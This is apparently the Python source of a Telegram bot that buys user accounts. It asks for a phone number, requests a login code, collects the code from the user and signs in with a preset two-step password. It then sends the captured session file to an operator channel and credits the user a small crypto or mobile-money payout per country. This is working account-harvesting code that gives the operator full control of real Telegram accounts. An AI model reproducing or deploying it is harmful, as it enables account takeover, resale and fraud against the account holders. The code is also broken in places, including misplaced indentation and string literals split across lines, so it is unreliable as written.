import asyncio
import json
import os
from datetime import datetime

from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError

from config import API_ID, API_HASH, BOT_TOKEN, CHANNEL_ID, ADMIN_ID, SESSION_2FA_PASSWORD

app = Client("bot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)

users = {}
sessions = {}
state = {}

def load_data():
    try:
        with open("data.json", "r") as f:
            return json.load(f)
    except:
        return {}

def save_data(data):
    with open("data.json", "w") as f:
        json.dump(data, f, indent=4)

user_data = load_data()
country_rates = {
    "BD": 0.25,
    "IN": 0.20,
    "PK": 0.22,
    "ID": 0.23,
}

@app.on_message(filters.command("start"))
async def start(_, msg):
    user_id = str(msg.from_user.id)
    if user_id not in user_data:
        user_data[user_id] = {
            "id": msg.from_user.id,
            "success": 0,
            "balance": 0.0,
            "joined": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_data(user_data)
   
    state[user_id] = "awaiting_phone"
await msg.reply(
    """🎉 Welcome to Robot!

Enter your phone number with the country code.
Example: +62xxxxxxx

Type /cap to see available countries.""",
    reply_markup=ReplyKeyboardMarkup(
        [["✅ Restart", "🌐 Capacity"],
         ["🎰 Cheak - Balance"],
         ["💸 Withdraw Accounts"],
         ["🆘 Need Help?"]],
        resize_keyboard=True
    )
)
@app.on_message(filters.command("cap"))
async def cap(_, msg):
    text = "🌐 Available Countries:
"
    for c, p in country_rates.items():
        text += f"🔹 {c}: ${p}
"
    await msg.reply(text)

@app.on_message(filters.command("account"))
async def account(_, msg):
    user_id = str(msg.from_user.id)
    d = user_data.get(user_id, {})
    await msg.reply(
        f"🎫 Your user account in the robot:

👤ID: {d.get('id')}
🥅  Totally success account : {d.get('success')}
💰 Your balance: ${d.get('balance')}
⏰ This post was taken in {d.get('joined')}"
    )

@app.on_message(filters.command("withdraw"))
async def withdraw(_, msg):
    user_id = str(msg.from_user.id)
    d = user_data.get(user_id, {})
    await msg.reply(
        f"🎫 Your user account in the robot:

👤ID: {d.get('id')}
🥅  Totally success account : {d.get('success')}
💰 Your balance: ${d.get('balance')}
⏰ This post was taken in {d.get('joined')}",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("USDT (Bep 20)", callback_data="withdraw_usdt")],
             [InlineKeyboardButton("TRX", callback_data="withdraw_trx")],
             [InlineKeyboardButton("BKASH", callback_data="withdraw_bkash")]]
        )
    )

@app.on_callback_query()
async def callback(_, query):
    user_id = str(query.from_user.id)
    d = user_data.get(user_id, {})
    option = query.data.split("_")[1].upper()
    await query.answer()
    await query.message.reply(f"✅ Withdraw request submitted via {option}.")
    await app.send_message(
        CHANNEL_ID,
        f"💸 Withdraw Report:

👤 User ID: {d.get('id')}
💰 Amount: ${d.get('balance')}
💳 Method: {option}
⏰ Time: {datetime.now()}"
    )
    d["balance"] = 0.0
    save_data(user_data)

@app.on_message(filters.command("support"))
async def support(_, msg):
    await msg.reply("🆘 Contact support: @xrd_didox")

@app.on_message(filters.text & filters.private)
async def handle_input(_, msg):
    user_id = str(msg.from_user.id)
    if state.get(user_id) == "awaiting_phone":
        phone = msg.text.strip()
        sessions[user_id] = {"phone": phone}
        await msg.reply("📨 Sending OTP...")
        asyncio.create_task(handle_otp(user_id, msg))
        state[user_id] = "awaiting_code"
    elif state.get(user_id) == "awaiting_code":
        code = msg.text.strip()
        sessions[user_id]["code"] = code
        await msg.reply("⏳ Verifying...")
        await verify_session(user_id, msg)

async def handle_otp(user_id, msg):
    phone = sessions[user_id]["phone"]
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        sessions[user_id]["client"] = client
        await msg.reply("📩 OTP sent. Please enter the code:")
    except PhoneNumberInvalidError:
        await msg.reply("❌ Invalid phone number.")
        state[user_id] = None

async def verify_session(user_id, msg):
    code = sessions[user_id]["code"]
    client = sessions[user_id]["client"]
    phone = sessions[user_id]["phone"]
    try:
        await client.sign_in(phone, code)
    except SessionPasswordNeededError:
        await client.sign_in(password=SESSION_2FA_PASSWORD)
    string = client.session.save()
    filename = f"session_{user_id}.session"
    with open(filename, "w") as f:
        f.write(string)
    await app.send_document(CHANNEL_ID, filename, caption=f"✅ Session for {phone}")
    os.remove(filename)
    await msg.reply("✅ Your account has been verified and saved.")
    user_data[user_id]["success"] += 1
    country = phone[1:3].upper()
    rate = country_rates.get(country, 0.20)
    user_data[user_id]["balance"] += rate
    save_data(user_data)
    await client.disconnect()
    state[user_id] = None

app.run()
